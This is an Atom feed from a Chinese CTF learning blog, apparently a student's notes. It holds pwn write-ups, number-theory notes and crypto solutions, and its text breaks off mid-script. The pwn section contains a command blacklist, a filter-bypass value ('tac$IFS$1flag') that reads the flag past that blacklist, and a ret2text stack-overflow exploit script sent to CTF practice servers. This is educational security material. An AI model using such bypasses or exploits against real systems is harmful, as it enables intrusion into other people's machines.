<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Kidder1&#39;s Blog!</title>
  
  
  <link href="https://kidder1.github.io/atom.xml" rel="self"/>
  
  <link href="https://kidder1.github.io/"/>
  <updated>2023-07-25T09:18:58.018Z</updated>
  <id>https://kidder1.github.io/</id>
  
  <author>
    <name>Kidder1</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>PWN_CTF</title>
    <link href="https://kidder1.github.io/2023/07/24/pwn/"/>
    <id>https://kidder1.github.io/2023/07/24/pwn/</id>
    <published>2023-07-24T02:24:36.000Z</published>
    <updated>2023-07-25T09:18:58.018Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CTFSHOW"><a href="#CTFSHOW" class="headerlink" title="CTFSHOW"></a>CTFSHOW</h1><h2 id="pwn37-38-return-text"><a href="#pwn37-38-return-text" class="headerlink" title="pwn37&#x2F;38(return text)"></a>pwn37&#x2F;38(return text)</h2><blockquote><p>ret2text (Return-to-text&#x2F;Return-to-code): ret2text 是一种利用栈溢出等漏洞，将程序控制流导向程序本身的代码区域（text&#x2F;code segment）的技术。在许多程序中，代码区域是可执行的，因此攻击者可以通过改变程序执行流程，使其执行恶意的代码。一般情况下，攻击者会在栈上放置一个指向代码区域中恶意代码的地址，然后通过溢出等漏洞改变函数的返回地址，使程序跳转到恶意代码并执行.。 </p></blockquote><h3 id="查看内存常用命令"><a href="#查看内存常用命令" class="headerlink" title="查看内存常用命令"></a>查看内存常用命令</h3><blockquote><p>dq      x&#x2F;10xg       p&#x2F;x    telescope </p></blockquote><p>GDB测偏移</p><a class="simple-lightbox" href="/2023/07/24/pwn/image-20230725170934385.png"><img   src="/images/loading.svg" data-src="/2023/07/24/pwn/image-20230725170934385.png"  class="" lazyload></a><h1 id="NSSCTF"><a href="#NSSCTF" class="headerlink" title="NSSCTF"></a>NSSCTF</h1><h2 id="SWPUCTF-2021-新生赛-nc签到（字符串过滤）"><a href="#SWPUCTF-2021-新生赛-nc签到（字符串过滤）" class="headerlink" title="[SWPUCTF 2021 新生赛]nc签到（字符串过滤）"></a>[SWPUCTF 2021 新生赛]nc签到（字符串过滤）</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blacklist = [<span class="string">&#x27;cat&#x27;</span>,<span class="string">&#x27;ls&#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;cd&#x27;</span>,<span class="string">&#x27;echo&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;$&#123;IFS&#125;&#x27;</span>]</span><br></pre></td></tr></table></figure><p>这里的${IFS}加大括号的原因是这样的</p><blockquote><p>在Unix和Unix-like系统（包括Linux）的shell中，<code>$&#123;IFS&#125;</code>使用大括号的形式是为了明确地指定一个环境变量。大括号在这里的作用是告诉shell，<code>$&#123;IFS&#125;</code>是一个环境变量的名称，而不是一个常规的字符串。</p><p><code>$&#123;IFS&#125;</code>中的<code>IFS</code>是一个特殊的环境变量，表示”Internal Field Separator”（内部字段分隔符）。它用于定义用于分隔单词和字段的字符，默认情况下包含空格、制表符和换行符。</p><p>在大括号内使用<code>$&#123;IFS&#125;</code>是一种良好的编程实践，尤其是在以下情况下：</p><ol><li>当需要将环境变量放在复杂的表达式中，以确保shell正确识别变量的边界。</li><li>当环境变量名后面跟着其他字符时，用大括号来明确指定变量的范围。</li></ol><p>例如，<code>$&#123;IFS&#125;abc</code>将会将<code>IFS</code>与<code>abc</code>拼接在一起，以生成一个新的字符串，而不是将<code>IFS</code>视为一个完整的变量名。</p><p>总之，使用大括号<code>$&#123;&#125;</code>来引用环境变量是一种良好的编程习惯，可以避免因变量名与其他字符混淆而引发错误。但在<code>$&#123;IFS&#125;</code>这个特定的例子中，如果<code>IFS</code>后面没有紧跟其他字符，大括号并不是必需的。所以在<code>$&#123;IFS&#125;</code>和<code>$IFS</code>之间没有实际的差异。</p></blockquote><p>但是，这里的字符串过滤中过滤掉了{IFS}，所以我们只能用空字符将其和后面的字符进行截断，这里使用的是$1,<code>$1</code>表示脚本或函数的第一个位置参数，为什么用这个呢？请看：</p><blockquote><p>如果没有传递任何参数给脚本，那么<code>$1</code>将为空。在这种情况下，<code>echo $1</code>将只打印出一个空行</p></blockquote><p>所以可以准确得出这里的$1可以将字符串进行截断，然后使用$IFS告诉终端这是一个环境变量代表的是空格，从而进行输出。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">art = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   ((  &quot;####@@!!$$    ))</span></span><br><span class="line"><span class="string">       `#####@@!$$`  ))</span></span><br><span class="line"><span class="string">    ((  &#x27;####@!!$:</span></span><br><span class="line"><span class="string">   ((  ,####@!!$:   ))</span></span><br><span class="line"><span class="string">       .###@!!$:</span></span><br><span class="line"><span class="string">       `##@@!$:</span></span><br><span class="line"><span class="string">        `#@!!$</span></span><br><span class="line"><span class="string">  !@#    `#@!$:       @#$</span></span><br><span class="line"><span class="string">   #$     `#@!$:       !@!</span></span><br><span class="line"><span class="string">            &#x27;@!$:</span></span><br><span class="line"><span class="string">        &#x27;`\   &quot;!$: /`&#x27;</span></span><br><span class="line"><span class="string">           &#x27;\  &#x27;!: /&#x27;</span></span><br><span class="line"><span class="string">             &quot;\ : /&quot;</span></span><br><span class="line"><span class="string">  -.&quot;-/\\\-.&quot;//.-&quot;/:`\.&quot;-.JrS&quot;.&quot;-=_\\</span></span><br><span class="line"><span class="string">&quot; -.&quot;-.\\&quot;-.&quot;//.-&quot;.`-.&quot;_\\-.&quot;.-\&quot;.-//&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(art)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;My_shell_ProVersion&quot;</span>)</span><br><span class="line"></span><br><span class="line">blacklist = [<span class="string">&#x27;cat&#x27;</span>,<span class="string">&#x27;ls&#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;cd&#x27;</span>,<span class="string">&#x27;echo&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;$&#123;IFS&#125;&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    command = <span class="built_in">input</span>()</span><br><span class="line">    <span class="built_in">print</span>(command)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> command:</span><br><span class="line">            <span class="built_in">print</span>(command)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">    os.system(command)</span><br><span class="line">    </span><br><span class="line">===================================================================================================================</span><br><span class="line">slove.py</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node2.anna.nssctf.cn&#x27;</span>,<span class="number">28994</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;tac$IFS$1flag&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="SWPUCTF-2021-新生赛-gift-pwn（栈溢出查看偏移）"><a href="#SWPUCTF-2021-新生赛-gift-pwn（栈溢出查看偏移）" class="headerlink" title="[SWPUCTF 2021 新生赛]gift_pwn（栈溢出查看偏移）"></a>[SWPUCTF 2021 新生赛]gift_pwn（栈溢出查看偏移）</h2><ol><li>直接用ida查看0x10 + 8</li></ol><a class="simple-lightbox" href="/2023/07/24/pwn/image-20230725121502497.png"><img   src="/images/loading.svg" data-src="/2023/07/24/pwn/image-20230725121502497.png"  class="" lazyload></a><ol start="2"><li><p>gdb覆盖查看，从rsp到rbp</p><a class="simple-lightbox" href="/2023/07/24/pwn/image-20230725121544874.png"><img   src="/images/loading.svg" data-src="/2023/07/24/pwn/image-20230725121544874.png"  class="" lazyload></a></li><li><p>cyclic 偏移查看： 一般cyclic -l 错误的偏移地址</p><p>这道题根据偏移直接送结果就可以了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">BINARY = <span class="string">&#x27;./attach&#x27;</span></span><br><span class="line">elf = ELF(BINARY)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(BINARY)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node2.anna.nssctf.cn&#x27;</span>,<span class="number">28217</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">s=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        gdb.attach(p, s)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">x, y</span>): <span class="keyword">return</span> log.success(<span class="string">f&#x27;<span class="subst">&#123;x&#125;</span>: <span class="subst">&#123;<span class="built_in">hex</span>(y)&#125;</span>&#x27;</span>)</span><br><span class="line">system = <span class="number">0x400480</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>) + p64(system)</span><br><span class="line"><span class="comment"># dbg()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CTFSHOW&quot;&gt;&lt;a href=&quot;#CTFSHOW&quot; class=&quot;headerlink&quot; title=&quot;CTFSHOW&quot;&gt;&lt;/a&gt;CTFSHOW&lt;/h1&gt;&lt;h2 id=&quot;pwn37-38-return-text&quot;&gt;&lt;a href=&quot;#pwn37-38-retu</summary>
      
    
    
    
    <category term="pwn" scheme="https://kidder1.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://kidder1.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>数论和抽象代数基础</title>
    <link href="https://kidder1.github.io/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/"/>
    <id>https://kidder1.github.io/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/</id>
    <published>2023-07-23T07:30:09.000Z</published>
    <updated>2023-07-25T09:21:44.798Z</updated>
    
    <content type="html"><![CDATA[<h1 id="素数-欧几里得定理-算术基本定理"><a href="#素数-欧几里得定理-算术基本定理" class="headerlink" title="素数  欧几里得定理  算术基本定理"></a>素数  欧几里得定理  算术基本定理</h1><a class="simple-lightbox" href="/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/image-20230723154128841.png"><img   src="/images/loading.svg" data-src="/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/image-20230723154128841.png"  class="" lazyload></a><h2 id=""><a href="#" class="headerlink" title=""></a><a class="simple-lightbox" href="/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/image-20230723154730486.png"><img   src="/images/loading.svg" data-src="/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/image-20230723154730486.png"  class="" lazyload></a></h2><h1 id="模运算"><a href="#模运算" class="headerlink" title="模运算"></a>模运算</h1><a class="simple-lightbox" href="/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/image-20230723154926042.png"><img   src="/images/loading.svg" data-src="/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/image-20230723154926042.png"  class="" lazyload></a><a class="simple-lightbox" href="/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/image-20230723155116655.png"><img   src="/images/loading.svg" data-src="/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/image-20230723155116655.png"  class="" lazyload></a><a class="simple-lightbox" href="/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/image-20230723155142800.png"><img   src="/images/loading.svg" data-src="/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/image-20230723155142800.png"  class="" lazyload></a><h1 id="欧几里得算法：辗转相除法"><a href="#欧几里得算法：辗转相除法" class="headerlink" title="欧几里得算法：辗转相除法"></a>欧几里得算法：辗转相除法</h1><a class="simple-lightbox" href="/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/image-20230723201741963.png"><img   src="/images/loading.svg" data-src="/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/image-20230723201741963.png"  class="" lazyload></a><p>将大的数字的最大公因数可以转换成小的数字进行计算</p><p><strong><a class="simple-lightbox" href="/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/image-20230723201915279.png"><img   src="/images/loading.svg" data-src="/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/image-20230723201915279.png"  class="" lazyload></a></strong></p><h1 id="乘法逆元"><a href="#乘法逆元" class="headerlink" title="乘法逆元"></a>乘法逆元</h1><p>​<a class="simple-lightbox" href="/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/image-20230723205038469.png"><img   src="/images/loading.svg" data-src="/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/image-20230723205038469.png"  class="" lazyload></a></p> <a class="simple-lightbox" href="/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/image-20230723210310770.png"><img   src="/images/loading.svg" data-src="/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/image-20230723210310770.png"  class="" lazyload></a><h1 id="中国剩余定理"><a href="#中国剩余定理" class="headerlink" title="中国剩余定理"></a>中国剩余定理</h1><a class="simple-lightbox" href="/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/image-20230723212100571.png"><img   src="/images/loading.svg" data-src="/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/image-20230723212100571.png"  class="" lazyload></a>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;素数-欧几里得定理-算术基本定理&quot;&gt;&lt;a href=&quot;#素数-欧几里得定理-算术基本定理&quot; class=&quot;headerlink&quot; title=&quot;素数  欧几里得定理  算术基本定理&quot;&gt;&lt;/a&gt;素数  欧几里得定理  算术基本定理&lt;/h1&gt;&lt;a class=&quot;sim</summary>
      
    
    
    
    <category term="math" scheme="https://kidder1.github.io/categories/math/"/>
    
    
    <category term="math" scheme="https://kidder1.github.io/tags/math/"/>
    
  </entry>
  
  <entry>
    <title>Crypto_CTF</title>
    <link href="https://kidder1.github.io/2023/07/20/crypto/"/>
    <id>https://kidder1.github.io/2023/07/20/crypto/</id>
    <published>2023-07-20T14:00:37.000Z</published>
    <updated>2023-07-25T09:19:20.276Z</updated>
    
    <content type="html"><![CDATA[<h1 id="HNCTF"><a href="#HNCTF" class="headerlink" title="HNCTF"></a>HNCTF</h1><h2 id="baBAbaseSEse（base家族）"><a href="#baBAbaseSEse（base家族）" class="headerlink" title="baBAbaseSEse（base家族）"></a>baBAbaseSEse（base家族）</h2><p>base家族 </p><ul><li><p>随波逐流梭哈</p><a class="simple-lightbox" href="/2023/07/20/crypto/image-20230720220320082.png"><img   src="/images/loading.svg" data-src="/2023/07/20/crypto/image-20230720220320082.png"  class="" lazyload></a></li><li><p>basecrack一把梭，windows我装不上，然后我就装到ubuntu了</p><a class="simple-lightbox" href="/2023/07/20/crypto/image-20230720224021152.png"><img   src="/images/loading.svg" data-src="/2023/07/20/crypto/image-20230720224021152.png"  class="" lazyload></a></li></ul><h2 id="babyRsa（基本RSA）"><a href="#babyRsa（基本RSA）" class="headerlink" title="babyRsa（基本RSA）"></a>babyRsa（基本RSA）</h2><p>基础知识</p><blockquote><p>注意：这里不能安装其他库，不然会因为版本问产生一系列的兼容性问题</p></blockquote><ol><li>PyCryptodome库主要由以下模块组成：</li></ol><ul><li><code>Crypto.Cipher</code>：包含对称加密算法，如AES、DES等。</li><li><code>Crypto.PublicKey</code>：包含非对称加密算法，如RSA、DSA等。</li><li><code>Crypto.Hash</code>：包含哈希函数，如SHA256、MD5等。</li><li><code>Crypto.Signature</code>：包含数字签名相关功能。</li><li><code>Crypto.Random</code>：提供随机数生成器。</li><li><code>Crypto.Protocol</code>：包含各种协议实现，如PBKDF2。</li><li><code>Crypto.Util</code>：包含一些实用工具，如填充、字节处理等</li></ul><ol start="2"><li><p>对于RSA的一些工具</p><ul><li><p><strong>YAFU</strong>： YAFU（Yet Another Factoring Utility）是一个开源的用于整数因数分解的命令行工具。它是一个强大而灵活的工具，能够分解大整数为其质因数，有助于解决数论和密码学领域中的问题。YAFU是基于GMP（GNU多精度算法库）的，并使用了多种因数分解算法来优化分解过程。它是数学爱好者、密码学研究人员和密码分析者常用的工具之一</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.使用 cmd 进入到 yafu 所在目录下，或将目录加入到系统环境 PATH 变量，或打开目录文件夹后 shift+右键 选择在此处打开 powershell </span><br><span class="line">2.假如要分解因数 6 ，输入命令：.\yafu-x64.exe &quot;factor(6)&quot;</span><br><span class="line">3.如果因数过长，将 因数 用文本文件存放在 yafu 目录下，例如：data.txt 。文件最后一行一定要换行，否则eof; done processing batchfile。 运行命令：.\yafu-x64.exe &quot;factor(@)&quot; -batchfile data.txt</span><br></pre></td></tr></table></figure></li><li><p><strong>FactorDB</strong>： FactorDB是一个在线的整数因数分解数据库。它允许用户将大整数提交到数据库，并查找其质因数分解。这个数据库是由全球用户提交的整数分解结果共同维护的，它采用了多种现代算法来分解整数。FactorDB 对于那些没有自己的因数分解工具或想要验证分解结果的用户来说是非常有用的。通过FactorDB，用户可以快速地找到一个整数的质因数，而无需自行进行因数分解运算 网站<a href="http://www.factordb.com/">factordb.com</a></p></li></ul><p>这个题是一个简单的RSA</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, getPrime</span><br><span class="line"><span class="comment"># 这里我们导入了bytes_to_long函数，它用于将字节转换为长整数（将flag转换为m），以及导入了getPrime函数，它用于生成指定位数的随机素数。</span></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">P39 = <span class="number">265147241000574873803071047177766359643</span></span><br><span class="line">P39 = <span class="number">234560843346150602519484260867514743467</span></span><br><span class="line">q = getPrime(<span class="number">128</span>)</span><br><span class="line">p = getPrime(<span class="number">128</span>)</span><br><span class="line"><span class="comment"># 这两行代码使用getPrime(128)函数生成两个128位的随机素数，并将它们赋值给变量p和q。在RSA加密中，p 和 q 是用于计算 RSA 公钥和私钥的重要参数。</span></span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">17331436837911040930486942133359735652484926528331507431552667656734821231501</span></span><br><span class="line"><span class="comment"># n 是RSA的模数，它是两个素数 p 和 q 的乘积。</span></span><br><span class="line"><span class="comment"># e 是RSA的公钥指数，通常为固定值 65537（也称为常用的 RSA 公钥指数）。</span></span><br><span class="line"><span class="comment"># c 是RSA的密文，通过用公钥指数 e 对明文 m 进行模幂运算得到。</span></span><br><span class="line"><span class="built_in">print</span>(n,c)</span><br><span class="line"><span class="comment"># 62193160459999883112594854240161159254035770172137079047232757011759606702281</span></span><br><span class="line"><span class="comment"># 17331436837911040930486942133359735652484926528331507431552667656734821231501</span></span><br></pre></td></tr></table></figure><p>通过上述工具进行分解之后，然后写出对应的解密脚本即可，这里主要是了解了这些库的一些基本使用而已</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">计算 RSA 私钥参数：</span><br><span class="line">使用已知的 p 和 q 计算了模数 n，并通过调用 invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>)) 函数计算得到私钥指数 d。</span><br><span class="line">RSA 解密并输出明文：</span><br><span class="line">使用得到的私钥指数 d 和模数 n，将密文 c 进行 RSA 解密，并通过 long_to_bytes 函数将解密后的长整数转换为明文，并进行输出。</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, getPrime, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = <span class="number">234560843346150602519484260867514743467</span></span><br><span class="line">q = <span class="number">265147241000574873803071047177766359643</span></span><br><span class="line">c = <span class="number">17331436837911040930486942133359735652484926528331507431552667656734821231501</span></span><br><span class="line">n = p * q</span><br><span class="line">d = invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,d,n)))</span><br></pre></td></tr></table></figure><p>然后安装了sage的软件，还没有使用，明天再看看吧！</p></li></ol><h2 id="A-dictator（凯撒密码）"><a href="#A-dictator（凯撒密码）" class="headerlink" title="A dictator（凯撒密码）"></a>A dictator（凯撒密码）</h2><p>凯撒密码就是根据偏移移位的密码</p><p>加密过程</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># # 用于生成一个在范围 [1, 100] 内的随机整数，并将其对 26 取模，以确保得到的偏移量在 0 到 25 之间</span></span><br><span class="line">offset = randint(<span class="number">1</span>,<span class="number">100</span>) % <span class="number">26</span></span><br><span class="line"><span class="built_in">print</span>(offset)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">&#x27;NSSCTF&#123;&#x27;</span>)</span><br><span class="line"><span class="comment"># 确保flag字符串中除去前7个字符和最后一个字符的部分，所有字符都不是大写字母</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">all</span>([<span class="built_in">ord</span>(c) <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>)) <span class="keyword">for</span> c <span class="keyword">in</span> flag[<span class="number">7</span>:-<span class="number">1</span>]])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> flag[<span class="number">7</span>:-<span class="number">1</span>]:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) &lt;= <span class="built_in">ord</span>(char) &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>):</span><br><span class="line">        <span class="comment"># 小写字母计算偏移量</span></span><br><span class="line">        index = <span class="built_in">ord</span>(char)-<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        <span class="comment"># 计算新的字符</span></span><br><span class="line">        new_char = <span class="built_in">chr</span>((index+offset)%<span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">        <span class="built_in">print</span>(new_char,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(char,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># 密文</span></span><br><span class="line"><span class="comment"># cipher = &#x27;nby_wuymul_wcjbyl_cm_ihy_iz_nby_gimn_vumcw_wfummcwuf_wcjbylm&#x27;</span></span><br></pre></td></tr></table></figure><p>解密过程：这个加密解密完都是小写字母，通过25个随机数字进行爆破解密即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cipher = <span 